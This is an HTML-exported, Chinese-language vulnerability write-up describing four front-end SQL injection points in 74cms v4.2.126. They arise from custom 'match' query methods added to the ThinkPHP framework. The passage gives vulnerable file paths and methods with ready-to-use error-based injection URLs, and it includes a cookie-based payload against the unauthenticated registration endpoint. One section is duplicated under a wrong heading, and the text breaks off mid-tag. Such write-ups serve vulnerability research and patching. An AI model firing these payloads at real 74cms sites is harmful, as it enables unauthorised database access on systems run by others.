<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xf718049cacc8fb9099ca21a2c0d57ba54ea8859"><span class="csDE05BCC">74cms v4.2.126-</span><span class="csECDA2D3">前台四处</span><span class="csDE05BCC">sql</span><span class="csECDA2D3">注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="Xfe4153402bdc4635d290748024da40d1d6dbcf4"><span class="csB2D98684">0x00 </span><span class="cs83F14626">前言</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">厂商：</span><span class="cs8926E06">74cms<br/></span><span class="cs9C1B1871">下载地址：</span><span class="cs8926E06">http://www.74cms.com/download/index.html<br/></span><span class="cs9C1B1871">关于版本：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">新版的</span><span class="cs8926E06">74cms</span><span class="cs9C1B1871">采用了</span><span class="cs8926E06">tp3.2.3</span><span class="cs9C1B1871">重构了，所以可知底层是</span><span class="cs8926E06">tp</span><span class="cs9C1B1871">，</span><span class="cs8926E06">74cms</span><span class="cs9C1B1871">新版升级是后台升级的，所以先将将升级方法。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">注：此漏洞不用升级至最新版本也可使用。</span></p><h2 class="cs868C439D">
			<a name="Xba13d4d928f7fb73006524e0ea39566f00c572c"><span class="csB2D98684">0x01 74cms</span><span class="cs83F14626">升级到最新版</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">1</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">先去官网下载</span><span class="cs8926E06"> </span><span class="cs9C1B1871">骑士人才系统基础版</span><span class="cs8926E06">(</span><span class="cs9C1B1871">安装包</span><span class="cs8926E06">)<br/>2</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">将下载好的包进行安装</span><span class="cs8926E06"><br/>3</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">进入后台点击查看如果不是最新版的话，请点击升级！</span><span class="cs8926E06"><br/>4</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">如果是本地环境的话，会提示</span><span class="cs8926E06"> </span><span class="cs9C1B1871">域名不合法升级失败，这个问题很好解决</span><span class="cs8926E06"><br/>5</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">搜索文件</span><span class="cs8926E06">74cms\upload\Application\Admin\Controller\ApplyController.class.php<br/>6</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">查找所有</span><span class="cs8926E06">$_SERVER[&#39;HTTP_HOST&#39;] </span><span class="cs9C1B1871">改为</span><span class="cs8926E06"> http://baidu.com </span><span class="cs9C1B1871">即可</span></p><h2 class="cs868C439D">
			<a name="Xeb398258bd1da2ab7455e6973d084db7714159d"><span class="csB2D98684">0x02 </span><span class="cs83F14626">概要</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个</span><span class="cs8926E06">74cms</span><span class="cs9C1B1871">独有的框架</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">注入漏洞</span><span class="cs8926E06"> : )<br/></span><span class="cs9C1B1871">这里我并不会脱离</span><span class="cs8926E06">74cms</span><span class="cs9C1B1871">重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。</span><span class="cs8926E06"><br/>ThinkPHP3.2.3</span><span class="cs9C1B1871">框架实现安全数据库操作分析</span><span class="cs8926E06"><br/>https://www.yuque.com/pmiaowu/bfgkkh/coglz1<br/></span><span class="cs9C1B1871">先看完上面的文章，然后在看此文章，会更简单的了解清楚。</span></p><h2 class="cs868C439D">
			<a name="X92d11117568d7ac3ae53e2d0abecb8f212f86db"><span class="csB2D98684">0x03 </span><span class="cs83F14626">漏洞讲解</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">非常抱歉，让读者看到前面</span><span class="cs8926E06"> 3</span><span class="cs9C1B1871">节</span><span class="cs8926E06"> </span><span class="cs9C1B1871">不是很有营养的东西。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在前面最开始的时候，我说过我有对比源码，使用手册的情况。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">所以这里我们继续在开始之前，我要使用在</span><span class="cs8926E06">74cms</span><span class="cs9C1B1871">这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高</span><span class="cs8926E06">=-=</span><span class="cs9C1B1871">，写文章感觉和很多前辈差距挺大的。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">为了能够更直观，这里开启调试</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">文件：</span><span class="cs8926E06">74cms\upload\Application\Common\Conf\config.php<br/></span><span class="cs9C1B1871">添加多一行</span></p><p class="cs3A447A38"><span class="cs9FB05234">&#39;SHOW_PAGE_TRACE&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; &nbsp;true,</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="362" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后打开文件：</span><span class="cs8926E06">74cms\upload\Application\Home\Controller\IndexController.class.php<br/></span><span class="cs9C1B1871">添加代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$uid = I(&#39;GET.uid&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">M(&#39;CompanyProfile&#39;)-&gt;field(&#39;companyname,logo&#39;)-&gt;where(array(&#39;uid&#39;=&gt;$uid))-&gt;find();</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image1.png" width="560" height="243" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image2.png" width="475" height="1344" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image3.png" width="560" height="410" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我感觉到这里可能有人要骂我了。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">应该有人会：</span><span class="cs8926E06"> </span><span class="cs9C1B1871">你个瓜皮，你家审计可以自己加代码的？</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数</span><span class="cs8926E06"> I </span><span class="cs9C1B1871">所以也是没有框架注入这一说。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">这里又要重新重复讲解</span><span class="cs8926E06">I</span><span class="cs9C1B1871">函数的作用了</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在我的眼中</span><span class="cs8926E06">I</span><span class="cs9C1B1871">函数就是一个为了解决框架底层设计问题的函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image4.png" width="560" height="273" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">神奇的</span><span class="cs8926E06">I</span><span class="cs9C1B1871">函数</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">路径</span><span class="cs8926E06">:ThinkPHP\Common\functions.php<br/></span><span class="cs9C1B1871">方法名：</span><span class="cs8926E06">function I($name,$default=&#39;&#39;,$filter=null,$datas=null)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image5.png" width="560" height="583" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这个函数的主要功能为</span><span class="cs8926E06">3</span><span class="cs9C1B1871">个</span><span class="cs8926E06"><br/>1</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">确定数据类型</span><span class="cs8926E06"><br/>2</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对数据进行循环取值</span><span class="cs8926E06"><br/>3</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">调用</span><span class="cs8926E06">think_filter </span><span class="cs9C1B1871">函数进行过滤</span><span class="cs8926E06"><br/>think_filter</span><span class="cs9C1B1871">函数分析</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image6.png" width="560" height="92" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs7FFD2630">例如：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">没有使用</span><span class="cs9FB05234">think_filter </span><span class="cs7FFD2630">函数时</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">goods_name[0]=in&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">使用了</span><span class="cs9FB05234">think_filter</span><span class="cs7FFD2630">函数时</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;goods_name[0]=in &amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;</span><span class="cs7FFD2630">注意：使用了</span><span class="cs9FB05234">think_filter</span><span class="cs7FFD2630">函数时</span><span class="cs9FB05234"> in</span><span class="cs7FFD2630">后面是有空格的也就是说返回值是</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">goods_name[0]=in(</span><span class="cs7FFD2630">空格</span><span class="cs9FB05234">)&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着我们直接打开文件：</span><span class="cs8926E06">74cms\upload\ThinkPHP\Library\Think\Db\Driver.class.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image7.png" width="560" height="61" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">think_filter</span><span class="cs7FFD2630">函数与上图两者对比一下，是否发现多点了东西？</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">是的没错了。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">74cms </span><span class="cs7FFD2630">修改了</span><span class="cs9FB05234">tp</span><span class="cs7FFD2630">底层添加了</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">3</span><span class="cs7FFD2630">个新方法：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">match</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;match_mode</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;match_with</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">也就是说这</span><span class="cs9FB05234">3</span><span class="cs7FFD2630">个方法我们是可以绕过</span><span class="cs9FB05234"> I </span><span class="cs7FFD2630">函数的过滤的</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">接着查看：</span><span class="cs9FB05234">parseWhereItem( </span><span class="cs7FFD2630">方法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image8.png" width="560" height="218" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用的是直接字符串拼接的方式入库，故判断此漏洞可利用</span><span class="cs8926E06">.<br/></span><span class="cs9C1B1871">注意了上图我们可控制的点是</span><span class="cs8926E06"> $str </span><span class="cs9C1B1871">而</span><span class="cs8926E06"> $str </span><span class="cs9C1B1871">给双引号包含！！！！！！！</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">最开始的时候，记得我说过么，系统默认</span><span class="cs8926E06">I </span><span class="cs9C1B1871">会过滤</span><span class="cs8926E06"> &ldquo;</span><span class="cs9C1B1871">双引号</span><span class="cs8926E06">&rdquo; </span><span class="cs9C1B1871">而导致此注入不可用，那么就需要找一处不经过</span><span class="cs8926E06">I</span><span class="cs9C1B1871">函数或是说不过滤双引号的地方来构造漏洞。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">这里我们重新修改一下例子：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">打开文件：</span><span class="cs8926E06"> 74cms\upload\Application\Home\Controller\IndexController.class.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image9.png" width="560" height="253" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs7FFD2630">输入</span><span class="cs9FB05234">url: http://74cms.test/index.php?m=Home&amp;c=index&amp;a=index&amp;uid[0]=match&amp;uid[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) &ndash; a</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image10.png" width="560" height="137" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了</span><span class="cs8926E06">74cms</span><span class="cs9C1B1871">独有的框架漏洞。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">接下来整理一下会发生注入的情况</span><span class="cs8926E06"><br/>M()-&gt;where($test)-&gt;xx<br/></span><span class="cs9C1B1871">那么只要</span><span class="cs8926E06"> where</span><span class="cs9C1B1871">中任意参数可控，并不会过滤</span><span class="cs8926E06"> </span><span class="cs9C1B1871">双引号即可！</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">然后就没什么技术含量了使用</span><span class="cs8926E06">ide</span><span class="cs9C1B1871">进行搜索测试即可确定漏洞，经过一顿搜索以后</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image11.png" width="560" height="312" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">后端注入，除了挖</span><span class="cs8926E06">src</span><span class="cs9C1B1871">，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看</span><span class="cs8926E06"> : )</span></p><h2 class="cs868C439D">
			<a name="Xc5d58b420ff058f154e789c8ee664e3e66be607"><span class="csB2D98684">0x04 74cms</span><span class="cs83F14626">独有框架漏洞第一处</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php<br/></span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">function company_focus($company_id)<br/></span><span class="cs9C1B1871">是否需登录：需要</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">登录权限：普通用户即可</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">登录后台</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image12.png" width="560" height="338" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注册完成以后登录前台即可</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">如果不登录的话，会显示这个样子</span><span class="cs8926E06"><br/>url:http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image13.png" width="560" height="171" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image14.png" width="560" height="129" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">看源码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image15.png" width="560" height="134" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">打开文件：</span><span class="cs8926E06"> 74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php<br/></span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">add_focus(</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image16.png" width="560" height="173" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="X294a119274e5dfdfd9235a368d7fea95c340f86"><span class="csB2D98684">0x05 74cms</span><span class="cs83F14626">独有框架漏洞第二处</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">74cms\upload\Application\Home\Controller\CompanyServiceController.class.php<br/></span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">order_pay_finish(<br/></span><span class="cs9C1B1871">是否需登录：需要</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">登录权限：企业用户即可</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">看源码</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image17.png" width="560" height="468" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image18.png" width="560" height="397" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注册完成以后登录前台即可</span></p><p class="cs3A447A38"><span class="cs9FB05234">url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">如果不登录的话，会显示这个样子</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url:http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image19.png" width="560" height="171" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image20.png" width="560" height="129" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">看源码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image21.png" width="560" height="134" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">打开文件：</span><span class="cs8926E06"> 74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php<br/></span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">add_focus(</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image22.png" width="560" height="173" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="X19923ef88ea81d70bfb33195dcfee06c12d8187"><span class="csB2D98684">0x06 74cms</span><span class="cs83F14626">独有框架漏洞第二处</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">74cms\upload\Application\Home\Controller\CompanyServiceController.class.php<br/></span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">order_pay_finish(<br/></span><span class="cs9C1B1871">是否需登录：需要</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">登录权限：企业用户即可</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">看源码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image23.png" width="560" height="352" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image24.png" width="560" height="200" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image25.png" width="560" height="468" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image26.png" width="560" height="397" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注册完成以后登录前台即可</span></p><p class="cs3A447A38"><span class="cs9FB05234">url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) &ndash; a</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image27.png" width="560" height="139" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="X69a1145622f073a646cded025edfa59097545c9"><span class="csB2D98684">0x07 74cms</span><span class="cs83F14626">独有框架漏洞第三处</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">74cms\upload\Application\Home\Controller\MembersController.class.php<br/></span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">register(<br/></span><span class="cs9C1B1871">是否需登录：不需要</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image28.png" width="560" height="274" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">url: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://74cms.test/index.php?m=&amp;c=Members&amp;a=register</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">reg_type=2&amp;utype=2&amp;ucenter=bind&amp;unbind_mobile=1</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">cookie:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">headers:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;X-Requested-With: XMLHttpRequest</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image29.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs7FFD2630">这里我要大概讲一下参数的问题</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">reg_type=2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">必须为</span><span class="cs9FB05234">2 </span><span class="cs7FFD2630">为了绕过一个注册判断，为</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">的话，会直接创建帐户，导致无法利用漏洞</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">utype=2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">判断会员类型的也必须为</span><span class="cs9FB05234">2 </span><span class="cs7FFD2630">为</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">会直接创建一条数据，导致无法利用漏洞</span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ucenter=bind &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">必须为</span><span class="cs9FB05234">bind</span><span class="cs7FFD2630">因为要靠他，获取</span><span 